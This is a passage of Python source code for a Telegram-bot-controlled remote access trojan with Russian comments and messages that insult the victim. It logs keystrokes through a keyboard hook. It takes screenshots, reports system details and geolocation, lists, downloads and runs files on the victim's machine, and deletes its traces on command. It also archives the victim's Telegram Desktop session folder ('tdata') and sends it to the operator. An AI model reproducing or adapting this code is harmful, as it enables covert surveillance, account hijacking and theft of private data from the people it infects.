def send_message_to_group(chat_id, screenshot):
    url = f"https://api.telegram.org/bot{telegram_bot_token}/sendPhoto"
    data = {'chat_id': chat_id, 'caption': f"System Name: {system_name}\nIP Address: {ip}"}
    image_buffer = BytesIO()
    screenshot.save(image_buffer, format='JPEG')
    image_buffer.seek(0)
    files = {'photo': ('screenshot.jpg', image_buffer)}
    response = requests.post(url, data=data, files=files)
def send_file_to_telegram(file_path, file_name):
    url = f'https://api.telegram.org/bot{telegram_bot_token}/sendDocument'
    for chat_id in chat_ids:
        files = {'document': (file_name, open(file_path, 'rb'))}
        data = {'chat_id': chat_id}
        response = requests.post(url, files=files, data=data)
        if response.status_code != 200:
            bot.send_message(chat_id, 'ОШИБКА БРАТИШ ХЗ ПОПРОБУЙ ЕЩЕ')
            print(f"Error sending file to Telegram. Chat ID: {chat_id}. Status code: {response.status_code}")
            print(response.text)
def send_message_on_start():
    username = os.getlogin()
    bot.send_message(chat_id, f"Подключен хуесос: {username}")
send_message_on_start()
user = os.environ.get("USERNAME")
user_folder = os.path.expanduser('~')
log_file = os.path.join(user_folder, 'keylogs.txt')
with open(log_file, "a") as f:
    f.write("-------------------------------------------------\n")
    f.write(user + " Log: " + strftime("%b %d@%H:%M") + "\n")
initi = False
def pressed_chars(event):
    if event.Ascii:
        with open(log_file, "a") as f:
            char = chr(event.Ascii)
            if event.Ascii == 8:
                f.write("[BS]")
            if event.Ascii == 9:
                f.write("[TAB]")
            if event.Ascii == 13:
                f.write("[ENTER]\n")
            f.write(char)
def checkchat_id(chat_id):
    return True
@bot.message_handler(commands=['capture_pc'])
def capture_pc(message):
    chat_id = message.chat.id
    bot.send_chat_action(chat_id, 'typing')
    screenshot = ImageGrab.grab()
    screenshot.save('screenshot.jpg')
    with open('screenshot.jpg', 'rb') as photo:
        bot.send_document(chat_id, photo)
    os.remove('screenshot.jpg')
@bot.message_handler(commands=['keylogs'])
def keylogs(message):
    chat_id = message.chat.id
    bot.send_chat_action(chat_id, 'upload_document')
    with open(log_file, "rb") as file:
        bot.send_document(chat_id, file)
@bot.message_handler(commands=['pc_info'])
def pc_info(message):
    chat_id = message.chat.id
    bot.send_chat_action(chat_id, 'typing')
    info = ''
    for pc_info in platform.uname():
        info += '\n' + pc_info
    bot.send_message(chat_id, info)
@bot.message_handler(commands=['msg_box'])
def msg_box(message):
    chat_id = message.chat.id
    message_text = message.text.replace('/msg_box ', '')
    if message_text == '':
        bot.send_message(chat_id, 'Please provide a message to display in the MessageBox. Usage: /msg_box yourText')
    else:
        bot.send_message(chat_id, f'Message to be displayed in the MessageBox: {message_text}')
        message_bytes = message_text.encode('cp1251')
        ctypes.windll.user32.MessageBoxA(0, message_bytes, 'Information', 0)
        bot.send_message(chat_id, 'MsgBox Displayed')
@bot.message_handler(commands=['ip_info'])
def ip_info(message):
    chat_id = message.chat.id
    bot.send_chat_action(chat_id, 'find_location')
    info = requests.get('http://ipinfo.io').text
    bot.send_message(chat_id, info)
    location = loads(info)['loc'].split(',')
    bot.send_location(chat_id, location[0], location[1])
@bot.message_handler(commands=['download_file'])
def download_file(message):
    chat_id = message.chat.id
    path = message.text.replace('/download_file', '').strip()
    if path == '':
        bot.send_chat_action(chat_id, 'typing')
        bot.send_message(chat_id, '/download_file C:/path/to/file')
    else:
        try:
            bot.send_chat_action(chat_id, 'upload_document')
            with open(path, 'rb') as file:
                bot.send_document(chat_id, file)
        except:
            bot.send_message(chat_id, 'Could not find file')
@bot.message_handler(commands=['list_dir'])
def list_dir(message):
    chat_id = message.chat.id
    path = message.text.replace('/list_dir', '').strip()
    if path == '':
        bot.send_message(chat_id, '/list_dir C:/path/to/folder')
    else:
        try:
            files = os.listdir(path)
            human_readable = '\n'.join(files)
            bot.send_message(chat_id, human_readable)
        except:
            bot.send_message(chat_id, 'Invalid path')
@bot.message_handler(commands=['run_file'])
def run_file(message):
    chat_id = message.chat.id
    path = message.text.replace('/run_file', '').strip()
    if path == '':
        bot.send_message(chat_id, '/run_file C:/path/to/file')
    else:
        os.startfile(path)
        bot.send_message(chat_id, 'Command executed')
@bot.message_handler(commands=['self_destruct'])
def self_destruct(message):
    chat_id = message.chat.id
    global initi
    initi = True
    bot.send_message(chat_id, "Are you sure? Type 'DESTROYNOW!' to proceed.")
@bot.message_handler(func=lambda message: message.text == 'DESTROYNOW!' and initi)
def destroy_all_traces(message):
    chat_id = message.chat.id
    bot.send_message(chat_id, "DESTROYING ALL TRACES! POOF!")
    if os.path.isfile(hide_location):
        os.remove(hide_location)
    if os.path.isfile(target_file):
        os.remove(target_file)
    if os.path.isfile(log_file):
        os.remove(log_file)
@bot.message_handler(commands=['start'])
def start(message):
    chat_id = message.chat.id
    markup = types.ReplyKeyboardMarkup(row_width=1)
    itembtn1 = types.KeyboardButton('/capture_pc')
    itembtn2 = types.KeyboardButton('/keylogs')
    itembtn3 = types.KeyboardButton('/pc_info')
    itembtn4 = types.KeyboardButton('/msg_box')
    itembtn5 = types.KeyboardButton('/ip_info')
    itembtn6 = types.KeyboardButton('/download_file')
    itembtn7 = types.KeyboardButton('/list_dir')
    itembtn8 = types.KeyboardButton('/run_file')
    itembtn9 = types.KeyboardButton('/archive_and_send')
    markup.add(itembtn1, itembtn2, itembtn3, itembtn4, itembtn5, itembtn6, itembtn7, itembtn8, itembtn9)
    bot.send_message(chat_id, "Выберите команду:", reply_markup=markup)
def create_zip_archive(source_dir, output_zip):
    try:
        with zipfile.ZipFile(output_zip + '.zip', 'w', compression=zipfile.ZIP_LZMA, compresslevel=9) as zipf:
            pass  # Создаем пустой архив для начала
        with zipfile.ZipFile(output_zip + '.zip', 'a') as zipf:  # Открываем архив для добавления файлов
            for root, _, files in os.walk(source_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    if "user_data" in file_path or "webview" in file_path or "temp" in file_path or "emoji" in file_path or "shortcuts-default.json" in file_path:
                        continue
                    try:
                        zipf.write(file_path, os.path.relpath(file_path, source_dir))
                    except Exception as e:
                        print(f"Error adding file to zip: {str(e)}")
        return output_zip + '.zip'
    except Exception as e:
        print(f"Error creating zip archive: {str(e)}")
        return None
def archive_and_send():
    user = os.path.expanduser("~")
    if os.path.exists(user + "\\AppData\\Roaming\\Telegram Desktop\\tdata"):
        try:
            source_dir = user + '\\AppData\\Roaming\\Telegram Desktop\\tdata'
            temp_dir = os.path.join(os.getcwd(), 'temp')
            if not os.path.exists(temp_dir):
                os.makedirs(temp_dir)  # Создаем папку, если её нет
            output_zip = os.path.join(temp_dir, 'Mraks_By_sx180')

            created_zip = create_zip_archive(source_dir, output_zip)
            if created_zip:
                send_file_to_telegram(created_zip, 'Mraks_By_sx180.zip')
            else:
                print("Failed to create or send zip file.")
        except Exception as e:
            print(f"Error creating or sending zip file: {str(e)}")
    else:
        print("Папка 'tdata' не найдена.")
@bot.message_handler(commands=['archive_and_send'])
def handle_archive_and_send(message):
    chat_id = message.chat.id
    archive_and_send()
    bot.send_message(chat_id, "Архивация и отправка файла завершены.")
print('СЛУШАЮ КОМАНДЫ...')
bot.polling()
proc = pyHook.HookManager()
proc.KeyDown = pressed_chars
proc.HookKeyboard()
pythoncom.PumpMessages()
